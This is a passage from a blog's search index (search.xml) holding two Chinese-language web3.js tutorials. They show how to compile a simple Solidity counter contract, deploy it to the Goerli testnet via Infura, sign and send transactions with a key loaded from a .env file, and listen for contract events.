<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用web3.js执行tx</title>
      <link href="/2023/07/23/web3.js/%E4%BD%BF%E7%94%A8web3.js%E6%89%A7%E8%A1%8Ctx/"/>
      <url>/2023/07/23/web3.js/%E4%BD%BF%E7%94%A8web3.js%E6%89%A7%E8%A1%8Ctx/</url>
      
        <content type="html"><![CDATA[<h1 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: Unlicense</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Incrementer</span> &#123;</span><br><span class="line">    event <span class="title class_">Reset</span>();</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">uint256 _initaNumer</span>) &#123;</span><br><span class="line">        number = _initaNumer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params">uint256 _value</span>) public &#123;</span><br><span class="line">        number = number + _value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        number = <span class="number">0</span>;</span><br><span class="line">        emit <span class="title class_">Reset</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getNumber</span>(<span class="params"></span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="js合约交互代码"><a href="#js合约交互代码" class="headerlink" title="js合约交互代码"></a>js合约交互代码</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> solc = <span class="built_in">require</span>(<span class="string">&#x27;solc&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//从配置中获取私钥</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>();</span><br><span class="line"><span class="keyword">const</span> privatekey = process.<span class="property">env</span>.<span class="property">PRIVATE_KEY</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载合约</span></span><br><span class="line"><span class="keyword">const</span> source = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;Incrementer.sol&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//编译solidity文件</span></span><br><span class="line"><span class="keyword">const</span> input = &#123;</span><br><span class="line">    <span class="attr">language</span>: <span class="string">&#x27;Solidity&#x27;</span>,</span><br><span class="line">    <span class="attr">sources</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Incrementer.sol&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">content</span>: source,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">settings</span>: &#123;</span><br><span class="line">        <span class="attr">outputSelection</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;*&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;*&#x27;</span>: [<span class="string">&#x27;*&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> tempFile = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(solc.<span class="title function_">compile</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(input)));</span><br><span class="line"><span class="keyword">const</span> contractFile = tempFile.<span class="property">contracts</span>[<span class="string">&#x27;Incrementer.sol&#x27;</span>][<span class="string">&#x27;Incrementer&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> bytecode = contractFile.<span class="property">evm</span>.<span class="property">bytecode</span>.<span class="property">object</span>;</span><br><span class="line"><span class="keyword">const</span> abi = contractFile.<span class="property">abi</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个web3的提供者</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&#x27;https://goerli.infura.io/v3/&#x27;</span> + process.<span class="property">env</span>.<span class="property">INFURA_ID</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据私钥创建账户</span></span><br><span class="line"><span class="keyword">const</span> account = web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">privateKeyToAccount</span>(privatekey);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> account_from = &#123;</span><br><span class="line">    <span class="attr">privateKey</span>: privatekey,</span><br><span class="line">    <span class="attr">accountAddress</span>: account.<span class="property">address</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//部署合约</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Deploy</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// //创建合约实例</span></span><br><span class="line">    <span class="comment">// const deployContract = new web3.eth.Contract(abi);</span></span><br><span class="line">    <span class="comment">// //发送部署tx</span></span><br><span class="line">    <span class="comment">// const deployTx = deployContract.deploy(&#123;</span></span><br><span class="line">    <span class="comment">//     data: bytecode,</span></span><br><span class="line">    <span class="comment">//     arguments: [111],</span></span><br><span class="line">    <span class="comment">// &#125;);</span></span><br><span class="line">    <span class="comment">// //签名tx</span></span><br><span class="line">    <span class="comment">// const deployTransaction = await web3.eth.accounts.signTransaction(</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         data: deployTx.encodeABI(),</span></span><br><span class="line">    <span class="comment">//         gas: 8000000,</span></span><br><span class="line">    <span class="comment">//     &#125;,</span></span><br><span class="line">    <span class="comment">//     account_from.privateKey</span></span><br><span class="line">    <span class="comment">// );</span></span><br><span class="line">    <span class="comment">// const deployReceipt = await web3.eth.sendSignedTransaction(deployTransaction.rawTransaction);</span></span><br><span class="line">    <span class="comment">// console.log(`Contract deployed at address: $&#123;deployReceipt.contractAddress&#125;`);</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;============================================&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;通过getnumber获取参数的值&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> incrementInstance = <span class="keyword">new</span> web3.<span class="property">eth</span>.<span class="title class_">Contract</span>(abi, <span class="string">&quot;0xAdD6C000C32c1A672f252fFf458e366948921C97&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> initNum = <span class="keyword">await</span> incrementInstance.<span class="property">methods</span>.<span class="title function_">getNumber</span>().<span class="title function_">call</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;当前初始化值是&quot;</span> + initNum); </span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;通过调用合约的自增方法来给合约num附上新值&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> newValue = <span class="number">2024</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue);</span><br><span class="line">    <span class="keyword">let</span> incrementTx01 = incrementInstance.<span class="property">methods</span>.<span class="title function_">increment</span>(newValue);</span><br><span class="line">    <span class="keyword">let</span> incrementTransation = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">signTransaction</span>(&#123;</span><br><span class="line">        <span class="attr">to</span>: <span class="string">&quot;0xAdD6C000C32c1A672f252fFf458e366948921C97&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: incrementTx01.<span class="title function_">encodeABI</span>(),</span><br><span class="line">        <span class="attr">gas</span>:<span class="number">8000000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">        account_from.<span class="property">privateKey</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// const incrementRes = await web3.eth.sendSignedTransaction(incrementTransation.rawTransaction);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// console.log(&#x27;Tx successful with hash &#x27; + incrementRes.transactionHash);</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;调用reset方法发出的事件&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> incrementTx02 = incrementInstance.<span class="property">methods</span>.<span class="title function_">reset</span>();</span><br><span class="line">    <span class="keyword">let</span> incrementTransation02 = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">signTransaction</span>(&#123;</span><br><span class="line">        <span class="attr">to</span>: <span class="string">&quot;0xAdD6C000C32c1A672f252fFf458e366948921C97&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: incrementTx02.<span class="title function_">encodeABI</span>(),</span><br><span class="line">        <span class="attr">gas</span>:<span class="number">8000000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">        account_from.<span class="property">privateKey</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// const incrementRes = await web3.eth.sendSignedTransaction(incrementTransation02.rawTransaction);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">ResetNum</span> = <span class="keyword">await</span> incrementInstance.<span class="property">methods</span>.<span class="title function_">getNumber</span>().<span class="title function_">call</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Reset后值&quot;</span> +<span class="title class_">ResetNum</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------监听事件---------&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> web3Scoket = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="keyword">new</span> <span class="title class_">Web3</span>.<span class="property">providers</span>.<span class="title class_">WebsocketProvider</span>(process.<span class="property">env</span>.<span class="property">Sockets</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> increment = <span class="keyword">new</span> web3Scoket.<span class="property">eth</span>.<span class="title class_">Contract</span>(abi, <span class="string">&quot;0xAdD6C000C32c1A672f252fFf458e366948921C97&quot;</span>);</span><br><span class="line">    increment.<span class="title function_">once</span>(<span class="string">&#x27;Reset&#x27;</span>, <span class="function">(<span class="params">error, event</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是一个监听事件&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Deploy</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="eth-Contract"><a href="#eth-Contract" class="headerlink" title="eth.Contract"></a>eth.Contract</h3><p>通过此方法获得合约实列incrementInstance</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> incrementInstance =<span class="keyword">new</span> web3.<span class="property">eth</span>.<span class="title class_">Contract</span>(abi, <span class="string">&quot;0xAdD6C000C32c1A672f252fFf458e366948921C97&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="methods获取实例的函数方法"><a href="#methods获取实例的函数方法" class="headerlink" title="methods获取实例的函数方法"></a>methods获取实例的函数方法</h3><p>call调用，initNum接受返回值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> initNum = <span class="keyword">await</span> incrementInstance.<span class="property">methods</span>.<span class="title function_">getNumber</span>().<span class="title function_">call</span>();</span><br></pre></td></tr></table></figure><h3 id="需要账户签名交互的函数"><a href="#需要账户签名交互的函数" class="headerlink" title="需要账户签名交互的函数"></a>需要账户签名交互的函数</h3><p>incrementTx01里面有他自己的abi编码，通过encodeABI()获得</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> incrementTx01 = incrementInstance.<span class="property">methods</span>.<span class="title function_">increment</span>(newValue);</span><br><span class="line"><span class="keyword">let</span> incrementTransation = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">signTransaction</span>(&#123;</span><br><span class="line">        <span class="attr">to</span>: <span class="string">&quot;0xAdD6C000C32c1A672f252fFf458e366948921C97&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: incrementTx01.<span class="title function_">encodeABI</span>(),</span><br><span class="line">        <span class="attr">gas</span>:<span class="number">8000000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">        account_from.<span class="property">privateKey</span></span><br><span class="line">    )</span><br><span class="line"> <span class="keyword">const</span> incrementRes = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(incrementTransation.<span class="property">rawTransaction</span>);</span><br></pre></td></tr></table></figure><h3 id="如何监听事件"><a href="#如何监听事件" class="headerlink" title="如何监听事件"></a>如何监听事件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------监听事件---------&quot;</span>);</span><br><span class="line">   </span><br><span class="line"><span class="keyword">const</span> web3Scoket = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="keyword">new</span> <span class="title class_">Web3</span>.<span class="property">providers</span>.<span class="title class_">WebsocketProvider</span>(process.<span class="property">env</span>.<span class="property">Sockets</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> increment = <span class="keyword">new</span> web3Scoket.<span class="property">eth</span>.<span class="title class_">Contract</span>(abi, <span class="string">&quot;0xAdD6C000C32c1A672f252fFf458e366948921C97&quot;</span>);</span><br><span class="line">increment.<span class="title function_">once</span>(<span class="string">&#x27;Reset&#x27;</span>, <span class="function">(<span class="params">error, event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是一个监听事件&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -web3.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用web3.js部署合约</title>
      <link href="/2023/07/23/web3.js/%E4%BD%BF%E7%94%A8web3.js%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6/"/>
      <url>/2023/07/23/web3.js/%E4%BD%BF%E7%94%A8web3.js%E9%83%A8%E7%BD%B2%E5%90%88%E7%BA%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-初始化项"><a href="#1-初始化项" class="headerlink" title="1.初始化项"></a>1.初始化项</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm init </span><br><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>生成package.json文件</p><h1 id="2-安装依赖"><a href="#2-安装依赖" class="headerlink" title="2.安装依赖"></a>2.安装依赖</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install dotenv@^<span class="number">10.0</span><span class="number">.0</span> fs@<span class="number">0.0</span><span class="number">.1</span>-security ganache-cli@^<span class="number">6.12</span><span class="number">.2</span> solc@<span class="number">0.8</span><span class="number">.0</span> web3@^<span class="number">1.3</span><span class="number">.5</span></span><br></pre></td></tr></table></figure><h1 id="3-配置env"><a href="#3-配置env" class="headerlink" title="3.配置env"></a>3.配置env</h1><p>生成一个.env文件</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">PRIVATE_KEY</span>=私钥</span><br><span class="line"><span class="variable constant_">INFURA_ID</span>=你的id</span><br></pre></td></tr></table></figure><h1 id="4-solidity文件"><a href="#4-solidity文件" class="headerlink" title="4.solidity文件"></a>4.solidity文件</h1><p>Incrementer.sol</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Incrementer &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initaNumer) &#123;</span><br><span class="line">        number = _initaNumer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increment(uint256 _value) public &#123;</span><br><span class="line">        number = number + _value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function reset() public &#123;</span><br><span class="line">        number = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getNumber() public view returns (uint256) &#123;</span><br><span class="line">        return number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-编写部署文件index-js"><a href="#5-编写部署文件index-js" class="headerlink" title="5.编写部署文件index.js"></a>5.编写部署文件index.js</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> solc = <span class="built_in">require</span>(<span class="string">&#x27;solc&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//从配置中获取私钥</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>();</span><br><span class="line"><span class="keyword">const</span> privatekey = process.<span class="property">env</span>.<span class="property">PRIVATE_KEY</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载合约</span></span><br><span class="line"><span class="comment">//source就是上面的合约的源代码</span></span><br><span class="line"><span class="keyword">const</span> source = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;Incrementer.sol&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="comment">// console.log(source);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//编译solidity文件</span></span><br><span class="line"><span class="keyword">const</span> input = &#123;</span><br><span class="line">    <span class="attr">language</span>: <span class="string">&#x27;Solidity&#x27;</span>,</span><br><span class="line">    <span class="attr">sources</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Incrementer.sol&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">content</span>: source,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">settings</span>: &#123;</span><br><span class="line">        <span class="attr">outputSelection</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;*&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;*&#x27;</span>: [<span class="string">&#x27;*&#x27;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// console.log(input);</span></span><br><span class="line"><span class="keyword">const</span> tempFile = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(solc.<span class="title function_">compile</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(input)));</span><br><span class="line"><span class="comment">// console.log(tempFile);</span></span><br><span class="line"><span class="keyword">const</span> contractFile = tempFile.<span class="property">contracts</span>[<span class="string">&#x27;Incrementer.sol&#x27;</span>][<span class="string">&#x27;Incrementer&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取bin和abi</span></span><br><span class="line"><span class="keyword">const</span> bytecode = contractFile.<span class="property">evm</span>.<span class="property">bytecode</span>.<span class="property">object</span>;</span><br><span class="line"><span class="keyword">const</span> abi = contractFile.<span class="property">abi</span>;</span><br><span class="line"><span class="comment">// console.log(abi);</span></span><br><span class="line"><span class="comment">//创建一个web3的提供者</span></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&#x27;https://goerli.infura.io/v3/&#x27;</span> + process.<span class="property">env</span>.<span class="property">INFURA_ID</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据私钥创建账户</span></span><br><span class="line"><span class="keyword">const</span> account = web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">privateKeyToAccount</span>(privatekey);</span><br><span class="line"><span class="comment">// console.log(&quot;jjk&quot;+account);</span></span><br><span class="line"><span class="keyword">const</span> account_from = &#123;</span><br><span class="line">    <span class="attr">privateKey</span>: privatekey,</span><br><span class="line">    <span class="attr">accountAddress</span>: account.<span class="property">address</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// console.log(account_from);</span></span><br><span class="line"><span class="comment">//部署合约</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Deploy</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">//创建合约实例</span></span><br><span class="line">    <span class="keyword">const</span> deployContract = <span class="keyword">new</span> web3.<span class="property">eth</span>.<span class="title class_">Contract</span>(abi);</span><br><span class="line">    <span class="comment">//发送部署tx</span></span><br><span class="line">    <span class="keyword">const</span> deployTx = deployContract.<span class="title function_">deploy</span>(&#123;</span><br><span class="line">        <span class="attr">data</span>: bytecode,</span><br><span class="line">        <span class="attr">arguments</span>: [<span class="number">0</span>],</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//签名tx</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(deployTx.<span class="title function_">encodeABI</span>());</span><br><span class="line">    <span class="keyword">const</span> deployTransaction = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">signTransaction</span>(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">data</span>: deployTx.<span class="title function_">encodeABI</span>(),</span><br><span class="line">            <span class="attr">gas</span>: <span class="number">8000000</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        account_from.<span class="property">privateKey</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">const</span> deployReceipt = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(deployTransaction.<span class="property">rawTransaction</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Contract deployed at address: <span class="subst">$&#123;deployReceipt.contractAddress&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Deploy</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> process.<span class="title function_">exit</span>(<span class="number">0</span>))</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="Input编译结果"><a href="#Input编译结果" class="headerlink" 